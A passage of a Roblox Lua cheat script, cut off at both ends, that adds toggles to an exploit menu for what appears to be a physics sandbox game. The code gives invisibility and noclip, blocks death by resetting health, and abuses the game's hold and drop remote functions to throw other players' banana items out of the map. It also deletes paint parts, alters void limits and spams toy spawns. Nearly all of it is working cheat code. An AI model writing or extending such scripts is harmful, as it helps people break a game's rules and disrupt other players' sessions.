                    Invisibility.originalPosition = Invisibility.humanoidRootPart.Position
                    Invisibility.originalCameraCFrame = Invisibility.camera.CFrame
                    Invisibility.humanoidRootPartTransparency = Invisibility.humanoidRootPart.Transparency

                    if Invisibility.humanoidRootPart then
                        Invisibility.humanoidRootPart.Transparency = 1
                    end

                    if Invisibility.noclipConnection then
                        Invisibility.noclipConnection:Disconnect()
                    end

                    Invisibility.noclipConnection = obj.RunService.Stepped:Connect(function()
                        for k, child in pairs(Invisibility.character:GetChildren()) do
                            if child:IsA("BasePart") then
                                child.CanCollide = false
                            end
                        end
                    end)

                    local n2 = Invisibility.originalPosition.Y + Invisibility.cameraOffset
                    local vector = Vector3.new(Invisibility.originalPosition.X, n2 - Invisibility.undergroundDepthOffset, Invisibility.originalPosition.Z)
                    Invisibility.humanoidRootPart.CFrame = CFrame.new(vector)
                    local cFrame = Invisibility.camera.CFrame
                    local vector2 = Vector3.new(vector.X, n2, vector.Z)
                    Invisibility.camera.CFrame = CFrame.new(vector2, vector2 + cFrame.LookVector)
                else
                    if Invisibility.noclipConnection then
                        Invisibility.noclipConnection:Disconnect()
                        Invisibility.noclipConnection = nil
                    end

                    if Invisibility.originalPosition then
                        local vector = Vector3.new(Invisibility.humanoidRootPart.Position.X, Invisibility.originalPosition.Y, Invisibility.humanoidRootPart.Position.Z)
                        Invisibility.humanoidRootPart.CFrame = CFrame.new(vector)
                    end

                    if Invisibility.humanoidRootPart then
                        local humanoidRootPart = Invisibility.humanoidRootPart
                        local humanoidRootPartTransparency = Invisibility.humanoidRootPartTransparency
                        local transparency = humanoidRootPartTransparency or 0
                        humanoidRootPart.Transparency = transparency
                    end
                end
            end,
        })

        v13:AddToggle("Antiragd", {
            Text = "Anti-Ragdoll",
            Default = false,
            Callback = function(antiragdollToggle)
                tbl2.AntiragdollToggle = antiragdollToggle

                if not tbl2.connections then
                    tbl2.connections = {}
                end

                if tbl2.AntiragdollToggle then
                    tbl2.onCharacter = function(arg)
                        local humanoid = arg:WaitForChild("Humanoid", 5)

                        if humanoid and tbl2.AntiragdollToggle then
                            humanoid.BreakJointsOnDeath = false
                            humanoid.AutoRotate = true
                            humanoid.PlatformStand = false

                            table.insert(tbl2.connections, humanoid.HealthChanged:Connect(function(health)
                                if tbl2.AntiragdollToggle and health <= 0 then
                                    humanoid.Health = 1
                                end
                            end))

                            table.insert(tbl2.connections, humanoid:GetPropertyChangedSignal("AutoRotate"):Connect(function()
                                if tbl2.AntiragdollToggle and humanoid.AutoRotate == false then
                                    humanoid.AutoRotate = true
                                end
                            end))

                            table.insert(tbl2.connections, humanoid:GetPropertyChangedSignal("PlatformStand"):Connect(function()
                                if tbl2.AntiragdollToggle and humanoid.PlatformStand == true then
                                    humanoid.PlatformStand = false
                                end
                            end))

                            table.insert(tbl2.connections, obj.RunService.RenderStepped:Connect(function()
                                if tbl2.AntiragdollToggle and humanoid.Sit and humanoid.SeatPart == nil then
                                    humanoid.Sit = false
                                end
                            end))
                        end
                    end

                    if localPlayer.Character then
                        tbl2.onCharacter(localPlayer.Character)
                    end

                    tbl2.charAddedConn = localPlayer.CharacterAdded:Connect(tbl2.onCharacter)
                else
                    for i, connection2 in ipairs(tbl2.connections) do
                        if connection2 then
                            connection2:Disconnect()
                        end
                    end

                    tbl2.connections = {}

                    if tbl2.charAddedConn then
                        tbl2.charAddedConn:Disconnect()
                        tbl2.charAddedConn = nil
                    end
                end
            end,
        })

        v13:AddToggle("antiragdoll", {
            Text = "Anti-Ragdoll (On Blob)",
            Default = false,
            Callback = function(antiRagBlob)
                tbl2.AntiRagBlob = antiRagBlob
                tbl2.BlobRagdollSit = false

                if tbl2.Contuuti.ARChar then
                    tbl2.Contuuti.ARChar:Disconnect()
                end

                if tbl2.Contuuti.ARSeat then
                    tbl2.Contuuti.ARSeat:Disconnect()
                end

                if tbl2.AntiRagBlob then
                    if localPlayer.Character then
                        local character = localPlayer.Character

                        if character and tbl2.AntiRagBlob then
                            local humanoid = character:WaitForChild("Humanoid", 5)
                            local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)

                            if humanoid and humanoidRootPart then
                                if tbl2.Contuuti.ARSeat then
                                    tbl2.Contuuti.ARSeat:Disconnect()
                                end

                                tbl2.Contuuti.ARSeat = humanoid:GetPropertyChangedSignal("SeatPart"):Connect(function()
                                    if humanoid.SeatPart and humanoid.SeatPart.Parent and humanoid.SeatPart.Parent.Name == "CreatureBlobman" and not tbl2.BlobRagdollSit then
                                        tbl2.BlobRagdollSit = true
                                        local seatPart = humanoid.SeatPart

                                        while not humanoid.Sit do
                                            task.wait()
                                        end

                                        RagdollRemote:FireServer(humanoidRootPart, 3)
                                        local ragdolled = humanoid:FindFirstChild("Ragdolled")

                                        while ragdolled and not ragdolled.Value and not humanoid.Sit do
                                            task.wait()
                                        end

                                        task.wait(0.4)
                                        humanoid.Sit = false
                                        seatPart:Sit(humanoid)

                                        task.delay(0.25, function()
                                            while humanoid and humanoid.SeatPart do
                                                RagdollRemote:FireServer(humanoidRootPart, 1)
                                                task.wait(0.05)
                                            end

                                            tbl2.BlobRagdollSit = false
                                        end)
                                    end
                                end)
                            end
                        end
                    end

                    tbl2.Contuuti.ARChar = localPlayer.CharacterAdded:Connect(function(character)
                        if not character or not tbl2.AntiRagBlob then
                            return
                        end
                        local humanoid = character:WaitForChild("Humanoid", 5)
                        local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)
                        if not humanoid or not humanoidRootPart then
                            return
                        end

                        if tbl2.Contuuti.ARSeat then
                            tbl2.Contuuti.ARSeat:Disconnect()
                        end

                        tbl2.Contuuti.ARSeat = humanoid:GetPropertyChangedSignal("SeatPart"):Connect(function()
                            if humanoid.SeatPart and humanoid.SeatPart.Parent and humanoid.SeatPart.Parent.Name == "CreatureBlobman" and not tbl2.BlobRagdollSit then
                                tbl2.BlobRagdollSit = true
                                local seatPart = humanoid.SeatPart

                                while not humanoid.Sit do
                                    task.wait()
                                end

                                RagdollRemote:FireServer(humanoidRootPart, 3)
                                local ragdolled = humanoid:FindFirstChild("Ragdolled")

                                while ragdolled and not ragdolled.Value and not humanoid.Sit do
                                    task.wait()
                                end

                                task.wait(0.4)
                                humanoid.Sit = false
                                seatPart:Sit(humanoid)

                                task.delay(0.25, function()
                                    while humanoid and humanoid.SeatPart do
                                        RagdollRemote:FireServer(humanoidRootPart, 1)
                                        task.wait(0.05)
                                    end

                                    tbl2.BlobRagdollSit = false
                                end)
                            end
                        end)
                    end)
                end
            end,
        })

        v13:AddToggle("AntiSit", {
            Text = "Anti-Sit",
            Default = false,
            Callback = function(antibananaSit)
                tbl2.antibananaSit = antibananaSit

                if antibananaSit then
                    task.spawn(function()
                        while tbl2.antibananaSit do
                            local character = localPlayer.Character
                            local humanoid = character and character:FindFirstChildOfClass("Humanoid")
                            local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
                            local currentCamera = workspace.CurrentCamera

                            if humanoid and humanoidRootPart and humanoid.Health > 0 then
                                humanoid.Sit = false
                                humanoid:ChangeState(Enum.HumanoidStateType.Running)
                                local lookVector = currentCamera.CFrame.LookVector
                                humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position, humanoidRootPart.Position + Vector3.new(lookVector.X, 0, lookVector.Z))
                            end

                            task.wait()
                        end
                    end)
                end
            end,
        })

        v13:AddToggle("AntiBananaD", {
            Text = "Anti-Banana (Destroy Banana)",
            Default = false,
            Callback = function(antbananadest)
                tbl2.Antbananadest = antbananadest
                local bananans = tbl2.Bananans
                local bananans2 = bananans or {}
                tbl2.Bananans = bananans2
                local antiBananaCon = tbl2.AntiBananaCon
                local antiBananaCon2 = antiBananaCon or {}
                tbl2.AntiBananaCon = antiBananaCon2

                for k, v46 in pairs(tbl2.AntiBananaCon) do
                    v46:Disconnect()
                    tbl2.AntiBananaCon[k] = nil
                end

                if not antbananadest then
                    table.clear(tbl2.Bananans)
                    return
                end
                local v46, v47, v48 = pairs(obj.Players:GetPlayers())
                local v49 = v48
                local v50 = v46
                local v51 = v47

                while true do
                    local v52, v53 = v50(v51, v49)
                    if v52 == nil then
                        break
                    end
                    v49 = v52
                    local v54 = obj.Workspace:FindFirstChild(v53.Name .. "SpawnedInToys")

                    if v54 then
                        for k, child in pairs(v54:GetChildren()) do
                            if child.Name == "FoodBanana" then
                                task.spawn(function()
                                    local v55 = nil

                                    if child then
                                        for k2, descendant in pairs(child:GetDescendants()) do
                                            if descendant.Name == "HoldPart" then
                                                v55 = descendant
                                                break
                                            end
                                        end
                                    end

                                    if v55 then
                                        local v56 = nil
                                        local v57 = nil
                                        local v58 = nil

                                        for k2, descendant in pairs(v55:GetDescendants()) do
                                            if descendant.Name == "HoldItemRemoteFunction" then
                                                v56 = descendant
                                            elseif descendant.Name == "DropItemRemoteFunction" then
                                                v57 = descendant
                                            elseif descendant.Name == "RigidConstraint" then
                                                v58 = descendant
                                            end
                                        end

                                        if v58 and v58:FindFirstChild("Attachment1") then
                                            repeat
                                                task.wait()
                                            until not v58:FindFirstChild("Attachment1") or not child.Parent
                                        end

                                        if v57 and v56 then
                                            repeat
                                                task.wait()

                                                task.spawn(function()
                                                    pcall(function()
                                                        v56:InvokeServer(child, getCharacter())
                                                    end)
                                                end)

                                                pcall(function()
                                                    v57:InvokeServer(child, CFrame.new(0, -51000, 0), Vector3.zero)
                                                end)
                                            until not child.Parent or not tbl2.Antbananadest

                                            if child.Parent then
                                                table.insert(tbl2.Bananans, child)
                                            end
                                        end
                                    end
                                end)
                            end
                        end

                        v49 = v52

                        tbl2.AntiBananaCon[v54.Name .. "BananaConn"] = v54.ChildAdded:Connect(function(child)
                            if child.Name == "FoodBanana" then
                                task.wait(obj.Stats.Network.ServerStatsItem["Data Ping"]:GetValue() / 900)

                                task.spawn(function()
                                    local v55 = nil

                                    if child then
                                        for k, descendant in pairs(child:GetDescendants()) do
                                            if descendant.Name == "HoldPart" then
                                                v55 = descendant
                                                break
                                            end
                                        end
                                    end

                                    if v55 then
                                        local v56 = nil
                                        local v57 = nil
                                        local v58 = nil

                                        for k, descendant in pairs(v55:GetDescendants()) do
                                            if descendant.Name == "HoldItemRemoteFunction" then
                                                v56 = descendant
                                            elseif descendant.Name == "DropItemRemoteFunction" then
                                                v57 = descendant
                                            elseif descendant.Name == "RigidConstraint" then
                                                v58 = descendant
                                            end
                                        end

                                        if v58 and v58:FindFirstChild("Attachment1") then
                                            repeat
                                                task.wait()
                                            until not v58:FindFirstChild("Attachment1") or not child.Parent
                                        end

                                        if v57 and v56 then
                                            repeat
                                                task.wait()

                                                task.spawn(function()
                                                    pcall(function()
                                                        v56:InvokeServer(child, getCharacter())
                                                    end)
                                                end)

                                                pcall(function()
                                                    v57:InvokeServer(child, CFrame.new(0, -51000, 0), Vector3.zero)
                                                end)
                                            until not child.Parent or not tbl2.Antbananadest

                                            if child.Parent then
                                                table.insert(tbl2.Bananans, child)
                                            end
                                        end
                                    end
                                end)
                            end
                        end)
                    end
                end

                if PlotItems then
                    local v52, v53, v54 = pairs(PlotItems:GetChildren())
                    local v55 = v54
                    local v56 = v52
                    local v57 = v53

                    while true do
                        local v58, v59 = v56(v57, v55)
                        if v58 == nil then
                            break
                        end
                        v55 = v58

                        if v59.Name ~= "PlayersInPlots" then
                            for k, child in pairs(v59:GetChildren()) do
                                if child.Name == "FoodBanana" then
                                    task.spawn(function()
                                        local v60 = nil

                                        if child then
                                            for k2, descendant in pairs(child:GetDescendants()) do
                                                if descendant.Name == "HoldPart" then
                                                    v60 = descendant
                                                    break
                                                end
                                            end
                                        end

                                        if v60 then
                                            local v61 = nil
                                            local v62 = nil
                                            local v63 = nil

                                            for k2, descendant in pairs(v60:GetDescendants()) do
                                                if descendant.Name == "HoldItemRemoteFunction" then
                                                    v61 = descendant
                                                elseif descendant.Name == "DropItemRemoteFunction" then
                                                    v62 = descendant
                                                elseif descendant.Name == "RigidConstraint" then
                                                    v63 = descendant
                                                end
                                            end

                                            if v63 and v63:FindFirstChild("Attachment1") then
                                                repeat
                                                    task.wait()
                                                until not v63:FindFirstChild("Attachment1") or not child.Parent
                                            end

                                            if v62 and v61 then
                                                repeat
                                                    task.wait()

                                                    task.spawn(function()
                                                        pcall(function()
                                                            v61:InvokeServer(child, getCharacter())
                                                        end)
                                                    end)

                                                    pcall(function()
                                                        v62:InvokeServer(child, CFrame.new(0, -51000, 0), Vector3.zero)
                                                    end)
                                                until not child.Parent or not tbl2.Antbananadest

                                                if child.Parent then
                                                    table.insert(tbl2.Bananans, child)
                                                end
                                            end
                                        end
                                    end)
                                end
                            end

                            v55 = v58

                            tbl2.AntiBananaCon[v59.Name .. "BananaConn"] = v59.ChildAdded:Connect(function(child)
                                if child.Name == "FoodBanana" then
                                    task.wait(obj.Stats.Network.ServerStatsItem["Data Ping"]:GetValue() / 900)

                                    task.spawn(function()
                                        local v60 = nil

                                        if child then
                                            for k, descendant in pairs(child:GetDescendants()) do
                                                if descendant.Name == "HoldPart" then
                                                    v60 = descendant
                                                    break
                                                end
                                            end
                                        end

                                        if v60 then
                                            local v61 = nil
                                            local v62 = nil
                                            local v63 = nil

                                            for k, descendant in pairs(v60:GetDescendants()) do
                                                if descendant.Name == "HoldItemRemoteFunction" then
                                                    v61 = descendant
                                                elseif descendant.Name == "DropItemRemoteFunction" then
                                                    v62 = descendant
                                                elseif descendant.Name == "RigidConstraint" then
                                                    v63 = descendant
                                                end
                                            end

                                            if v63 and v63:FindFirstChild("Attachment1") then
                                                repeat
                                                    task.wait()
                                                until not v63:FindFirstChild("Attachment1") or not child.Parent
                                            end

                                            if v62 and v61 then
                                                repeat
                                                    task.wait()

                                                    task.spawn(function()
                                                        pcall(function()
                                                            v61:InvokeServer(child, getCharacter())
                                                        end)
                                                    end)

                                                    pcall(function()
                                                        v62:InvokeServer(child, CFrame.new(0, -51000, 0), Vector3.zero)
                                                    end)
                                                until not child.Parent or not tbl2.Antbananadest

                                                if child.Parent then
                                                    table.insert(tbl2.Bananans, child)
                                                end
                                            end
                                        end
                                    end)
                                end
                            end)
                        end
                    end
                end

                tbl2.AntiBananaCon.PlayerAddedBanana = obj.Players.PlayerAdded:Connect(function(player)
                    player.CharacterAppearanceLoaded:Wait()
                    task.wait(0.2)
                    local v52 = obj.Workspace:FindFirstChild(player.Name .. "SpawnedInToys")

                    if v52 and tbl2.Antbananadest then
                        for k, child in pairs(v52:GetChildren()) do
                            if child.Name == "FoodBanana" then
                                task.spawn(function()
                                    local v53 = nil

                                    if child then
                                        for k2, descendant in pairs(child:GetDescendants()) do
                                            if descendant.Name == "HoldPart" then
                                                v53 = descendant
                                                break
                                            end
                                        end
                                    end

                                    if v53 then
                                        local v54 = nil
                                        local v55 = nil
                                        local v56 = nil

                                        for k2, descendant in pairs(v53:GetDescendants()) do
                                            if descendant.Name == "HoldItemRemoteFunction" then
                                                v54 = descendant
                                            elseif descendant.Name == "DropItemRemoteFunction" then
                                                v55 = descendant
                                            elseif descendant.Name == "RigidConstraint" then
                                                v56 = descendant
                                            end
                                        end

                                        if v56 and v56:FindFirstChild("Attachment1") then
                                            repeat
                                                task.wait()
                                            until not v56:FindFirstChild("Attachment1") or not child.Parent
                                        end

                                        if v55 and v54 then
                                            repeat
                                                task.wait()

                                                task.spawn(function()
                                                    pcall(function()
                                                        v54:InvokeServer(child, getCharacter())
                                                    end)
                                                end)

                                                pcall(function()
                                                    v55:InvokeServer(child, CFrame.new(0, -51000, 0), Vector3.zero)
                                                end)
                                            until not child.Parent or not tbl2.Antbananadest

                                            if child.Parent then
                                                table.insert(tbl2.Bananans, child)
                                            end
                                        end
                                    end
                                end)
                            end
                        end

                        tbl2.AntiBananaCon[v52.Name .. "BananaConn"] = v52.ChildAdded:Connect(function(child)
                            if child.Name == "FoodBanana" then
                                task.wait(obj.Stats.Network.ServerStatsItem["Data Ping"]:GetValue() / 900)

                                task.spawn(function()
                                    local v53 = nil

                                    if child then
                                        for k, descendant in pairs(child:GetDescendants()) do
                                            if descendant.Name == "HoldPart" then
                                                v53 = descendant
                                                break
                                            end
                                        end
                                    end

                                    if v53 then
                                        local v54 = nil
                                        local v55 = nil
                                        local v56 = nil

                                        for k, descendant in pairs(v53:GetDescendants()) do
                                            if descendant.Name == "HoldItemRemoteFunction" then
                                                v54 = descendant
                                            elseif descendant.Name == "DropItemRemoteFunction" then
                                                v55 = descendant
                                            elseif descendant.Name == "RigidConstraint" then
                                                v56 = descendant
                                            end
                                        end

                                        if v56 and v56:FindFirstChild("Attachment1") then
                                            repeat
                                                task.wait()
                                            until not v56:FindFirstChild("Attachment1") or not child.Parent
                                        end

                                        if v55 and v54 then
                                            repeat
                                                task.wait()

                                                task.spawn(function()
                                                    pcall(function()
                                                        v54:InvokeServer(child, getCharacter())
                                                    end)
                                                end)

                                                pcall(function()
                                                    v55:InvokeServer(child, CFrame.new(0, -51000, 0), Vector3.zero)
                                                end)
                                            until not child.Parent or not tbl2.Antbananadest

                                            if child.Parent then
                                                table.insert(tbl2.Bananans, child)
                                            end
                                        end
                                    end
                                end)
                            end
                        end)
                    end
                end)

                for k, bananan in pairs(tbl2.Bananans) do
                    task.spawn(function()
                        local v52 = nil

                        if bananan then
                            for k2, descendant in pairs(bananan:GetDescendants()) do
                                if descendant.Name == "HoldPart" then
                                    v52 = descendant
                                    break
                                end
                            end
                        end

                        if v52 then
                            local v53 = nil
                            local v54 = nil
                            local v55 = nil

                            for k2, descendant in pairs(v52:GetDescendants()) do
                                if descendant.Name == "HoldItemRemoteFunction" then
                                    v53 = descendant
                                elseif descendant.Name == "DropItemRemoteFunction" then
                                    v54 = descendant
                                elseif descendant.Name == "RigidConstraint" then
                                    v55 = descendant
                                end
                            end

                            if v55 and v55:FindFirstChild("Attachment1") then
                                repeat
                                    task.wait()
                                until not v55:FindFirstChild("Attachment1") or not bananan.Parent
                            end

                            if v54 and v53 then
                                repeat
                                    task.wait()

                                    task.spawn(function()
                                        pcall(function()
                                            v53:InvokeServer(bananan, getCharacter())
                                        end)
                                    end)

                                    pcall(function()
                                        v54:InvokeServer(bananan, CFrame.new(0, -51000, 0), Vector3.zero)
                                    end)
                                until not bananan.Parent or not tbl2.Antbananadest

                                if bananan.Parent then
                                    table.insert(tbl2.Bananans, bananan)
                                end
                            end
                        end
                    end)
                end

                table.clear(tbl2.Bananans)
            end,
        })

        v13:AddToggle("AntiPaint", {
            Text = "Anti-Paint",
            Default = false,
            Callback = function(arg)
                if arg then
                    for i, descendant in ipairs(workspace:GetDescendants()) do
                        if descendant:IsA("BasePart") and descendant.Name == "PaintPlayerPart" then
                            local clone = descendant:Clone()
                            clone.Archivable = true
                            tbl2.paintPartsBackup[descendant:GetDebugId()] = {clone = clone, parent = descendant.Parent}
                            descendant:Destroy()
                        end
                    end

                    table.insert(tbl2.paintConnections, workspace.DescendantAdded:Connect(function(descendant)
                        if descendant:IsA("BasePart") and descendant.Name == "PaintPlayerPart" then
                            task.defer(function()
                                if descendant and descendant.Parent then
                                    local clone = descendant:Clone()
                                    clone.Archivable = true
                                    tbl2.paintPartsBackup[descendant:GetDebugId()] = {clone = clone, parent = descendant.Parent}
                                    descendant:Destroy()
                                end
                            end)
                        end
                    end))

                    if localPlayer.Character then
                        for i, child in ipairs(localPlayer.Character:GetChildren()) do
                            if child:IsA("BasePart") then
                                child.CanTouch = false
                                child.CanQuery = false
                            end
                        end
                    end
                else
                    for i, paintConnection in ipairs(tbl2.paintConnections) do
                        if paintConnection.Connected then
                            paintConnection:Disconnect()
                        end
                    end

                    tbl2.paintConnections = {}

                    for k, v46 in pairs(tbl2.paintPartsBackup) do
                        if v46.clone and v46.parent then
                            v46.clone.Parent = v46.parent
                        end
                    end

                    tbl2.paintPartsBackup = {}

                    if localPlayer.Character then
                        for i, child in ipairs(localPlayer.Character:GetChildren()) do
                            if child:IsA("BasePart") then
                                child.CanTouch = true
                                child.CanQuery = true
                            end
                        end
                    end
                end
            end,
        })

        v13:AddToggle("teeeeees", {
            Text = "Anti-Input (Banjo)",
            Default = false,
            Callback = function(arg)
                if arg then
                    if not tbl2.loopActive then
                        local menuToys2 = obj.ReplicatedStorage:FindFirstChild("MenuToys")

                        if menuToys2 then
                            tbl2.spawnToyRemote = menuToys2:FindFirstChild("SpawnToyRemoteFunction")
                            tbl2.destroyToyRemote = menuToys2:FindFirstChild("DestroyToy")
                        end

                        if not tbl2.runLoop then
                            tbl2.loopActive = true

                            tbl2.runLoop = obj.RunService.Heartbeat:Connect(function()
                                if not tbl2.loopActive then
                                    return
                                end
                                local v46 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")

                                if v46 then
                                    local v47 = v46:FindFirstChild(tbl2.targetToy)

                                    if not v47 then
                                        local v48 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                                        local v49 = v48 and v48:FindFirstChild(tbl2.targetToy)

                                        if v49 and tbl2.destroyToyRemote then
                                            pcall(function()
                                                tbl2.destroyToyRemote:FireServer(v49)
                                            end)
                                        end

                                        local character = localPlayer.Character
                                        local cFrame = character and localPlayer.Character.PrimaryPart and localPlayer.Character.PrimaryPart.CFrame or CFrame.new(0, 5, 0)

                                        if tbl2.spawnToyRemote then
                                            pcall(function()
                                                tbl2.spawnToyRemote:InvokeServer(tbl2.targetToy, cFrame, Vector3.new(0, 90, 0))
                                            end)
                                        end

                                        for i = 1, 15 do
                                            v47 = v46:FindFirstChild(tbl2.targetToy)
                                            if v47 then
                                                break
                                            end
                                            task.wait(1e-08)
                                        end
                                    end

                                    if v47 then
                                        local character = localPlayer.Character

                                        if v47 and character then
                                            local head_ = character:FindFirstChild("Head")

                                            if head_ then
                                                local holdPart = v47:FindFirstChild("HoldPart")

                                                if holdPart then
                                                    local holdItemRemoteFunction = holdPart:FindFirstChild("HoldItemRemoteFunction")
                                                    local dropItemRemoteFunction = holdPart:FindFirstChild("DropItemRemoteFunction")

                                                    if holdItemRemoteFunction and dropItemRemoteFunction then
                                                        local n2 = head_.CFrame * CFrame.new(0, 3, 0)

                                                        task.spawn(function()
                                                            pcall(function()
                                                                holdItemRemoteFunction:InvokeServer(v47, character)
                                                                dropItemRemoteFunction:InvokeServer(v47, n2, n2)
                                                            end)
                                                        end)
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end)
                        end

                        if not tbl2.respawnHandler then
                            tbl2.respawnHandler = localPlayer.CharacterAdded:Connect(function()
                                if tbl2.loopActive then
                                    task.wait(0.5)
                                    tbl2.loopActive = false

                                    if tbl2.runLoop then
                                        tbl2.runLoop:Disconnect()
                                        tbl2.runLoop = nil
                                    end

                                    local v46 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                                    local v47 = v46 and v46:FindFirstChild(tbl2.targetToy)

                                    if v47 and tbl2.destroyToyRemote then
                                        pcall(function()
                                            tbl2.destroyToyRemote:FireServer(v47)
                                        end)
                                    end

                                    task.wait(0.1)

                                    if not tbl2.runLoop then
                                        tbl2.loopActive = true

                                        tbl2.runLoop = obj.RunService.Heartbeat:Connect(function()
                                            if not tbl2.loopActive then
                                                return
                                            end
                                            local v48 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")

                                            if v48 then
                                                local v49 = v48:FindFirstChild(tbl2.targetToy)

                                                if not v49 then
                                                    local v50 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                                                    local v51 = v50 and v50:FindFirstChild(tbl2.targetToy)

                                                    if v51 and tbl2.destroyToyRemote then
                                                        pcall(function()
                                                            tbl2.destroyToyRemote:FireServer(v51)
                                                        end)
                                                    end

                                                    local character = localPlayer.Character
                                                    local cFrame = character and localPlayer.Character.PrimaryPart and localPlayer.Character.PrimaryPart.CFrame or CFrame.new(0, 5, 0)

                                                    if tbl2.spawnToyRemote then
                                                        pcall(function()
                                                            tbl2.spawnToyRemote:InvokeServer(tbl2.targetToy, cFrame, Vector3.new(0, 90, 0))
                                                        end)
                                                    end

                                                    for i = 1, 15 do
                                                        v49 = v48:FindFirstChild(tbl2.targetToy)
                                                        if v49 then
                                                            break
                                                        end
                                                        task.wait(1e-08)
                                                    end
                                                end

                                                if v49 then
                                                    local character = localPlayer.Character

                                                    if v49 and character then
                                                        local head_ = character:FindFirstChild("Head")

                                                        if head_ then
                                                            local holdPart = v49:FindFirstChild("HoldPart")

                                                            if holdPart then
                                                                local holdItemRemoteFunction = holdPart:FindFirstChild("HoldItemRemoteFunction")
                                                                local dropItemRemoteFunction = holdPart:FindFirstChild("DropItemRemoteFunction")

                                                                if holdItemRemoteFunction and dropItemRemoteFunction then
                                                                    local n2 = head_.CFrame * CFrame.new(0, 3, 0)

                                                                    task.spawn(function()
                                                                        pcall(function()
                                                                            holdItemRemoteFunction:InvokeServer(v49, character)
                                                                            dropItemRemoteFunction:InvokeServer(v49, n2, n2)
                                                                        end)
                                                                    end)
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                        end)
                                    end
                                end
                            end)
                        end

                        print("Protection active (Banjo).")
                    end
                else
                    tbl2.loopActive = false

                    if tbl2.runLoop then
                        tbl2.runLoop:Disconnect()
                        tbl2.runLoop = nil
                    end

                    local v46 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                    local v47 = v46 and v46:FindFirstChild(tbl2.targetToy)

                    if v47 and tbl2.destroyToyRemote then
                        pcall(function()
                            tbl2.destroyToyRemote:FireServer(v47)
                        end)
                    end

                    if tbl2.respawnHandler then
                        tbl2.respawnHandler:Disconnect()
                        tbl2.respawnHandler = nil
                    end

                    print("Protection stopped.")
                end
            end,
        })

        v13:AddButton({
            Text = "Delete Legs",
            Func = function()
                local character = localPlayer.Character
                local humanoid = character:FindFirstChild("Humanoid")
                local humanoid2 = humanoid or character:WaitForChild("Humanoid")
                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                local humanoidRootPart2 = humanoidRootPart or character:WaitForChild("HumanoidRootPart")
                local leftLeg = character:FindFirstChild("Left Leg")
                local rightLeg = character:FindFirstChild("Right Leg")
                if not leftLeg or not rightLeg then
                    return
                end
                local pivot = character:GetPivot()
                local fallenPartsDestroyHeight = workspace.FallenPartsDestroyHeight
                workspace.FallenPartsDestroyHeight = -50000
                RagdollRemote:FireServer(humanoidRootPart2, 1)
                task.wait(0.5)
                rightLeg.CFrame = CFrame.new(0, -60000, 0)
                leftLeg.CFrame = CFrame.new(0, -60000, 0)
                task.wait(0.1)
                character:PivotTo(CFrame.new(0, -55970, 0))
                task.wait(0.1)
                character:PivotTo(pivot)
                workspace.FallenPartsDestroyHeight = fallenPartsDestroyHeight

                task.delay(0.3, function()
                    while task.wait() and humanoid2 and humanoid2.Health ~= 0 and not character:FindFirstChild("Right Leg") do
                        if localPlayer.PlayerGui.ControlsGui.PCFrame.Stand.Visible == false then
                            humanoid2.HipHeight = 2
                        else
                            humanoid2.HipHeight = 0
                        end
                    end
                end)
            end,
        })

        toggles.AntiLag = v13:AddToggle("Antilag", {
            Text = "Anti-Lag",
            Default = false,
            Callback = function(arg)
                tbl2.CountLines = 0
                local v46 = CharacterAndBeamMove
                local enabled

                if arg then
                    enabled = false
                else
                    enabled = true
                end

                v46.Enabled = enabled
                local v47 = AntiShuriLag
                local enabled2

                if arg then
                    enabled2 = false
                else
                    enabled2 = true
                end

                v47.Enabled = enabled2
            end,
        })

        v13:AddToggle("AntilagAuto", {
            Text = "Auto Anti-Lag",
            Default = true,
            Callback = function(autoAntiLag)
                tbl2.AutoAntiLag = autoAntiLag
            end,
        })

        v14:AddToggle("Antivoid", {
            Text = "Anti-Void",
            Default = false,
            Callback = function(arg)
                if arg then
                    if not originalVoidHeight then
                        originalVoidHeight = workspace.FallenPartsDestroyHeight
                    end

                    workspace.FallenPartsDestroyHeight = -1e+95
                else
                    local v46 = workspace
                    local v47 = originalVoidHeight
                    local fallenPartsDestroyHeight = v47 or -100
                    v46.FallenPartsDestroyHeight = fallenPartsDestroyHeight
                end
            end,
        })

        v14:AddToggle("Antiburn", {
            Text = "Anti-Burn",
            Default = false,
            Callback = function(arg)
                local poisonBigHole = workspace:WaitForChild("Map"):WaitForChild("Hole"):WaitForChild("PoisonBigHole")
                local position = poisonBigHole:GetPivot().Position
                local extinguishPart = poisonBigHole:FindFirstChild("ExtinguishPart")

                if not extinguishPart then
                    extinguishPart = Instance.new("Part")
                    extinguishPart.Name = "ExtinguishPart"
                    extinguishPart.Size = Vector3.new(4, 1, 4)
                    extinguishPart.Anchored = true
                    extinguishPart.CanCollide = false
                    extinguishPart.Transparency = 1
                    extinguishPart.Position = position
                    extinguishPart.Parent = poisonBigHole
                end

                if arg then
                    if not tbl2.AntiBurnndada then
                        tbl2.AntiBurnndada = obj.RunService.Heartbeat:Connect(function()
                            local character = localPlayer.Character
                            local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

                            if humanoidRootPart then
                                local fireLight = humanoidRootPart:FindFirstChild("FireLight")
                                local fireParticleEmitter = humanoidRootPart:FindFirstChild("FireParticleEmitter")

                                if not fireLight and not fireParticleEmitter then
                                    local cframe = CFrame.new(position)
                                    extinguishPart.CFrame = cframe
                                else
                                    extinguishPart.CFrame = humanoidRootPart.CFrame
                                end
                            end
                        end)
                    end
                else
                    if tbl2.AntiBurnndada then
                        tbl2.AntiBurnndada:Disconnect()
                        tbl2.AntiBurnndada = nil
                    end

                    if extinguishPart then
                        extinguishPart.CFrame = CFrame.new(position)
                    end
                end
            end,
        })

        v14:AddToggle("AntiexeV", {
            Text = "Anti-Explosion (Visual)",
            Default = false,
            Callback = function(arg)
                if PlayerScripts then
                    local clientExoplosionHandler = PlayerScripts:FindFirstChild("ClientExoplosionHandler")

                    if clientExoplosionHandler then
                        local enabled

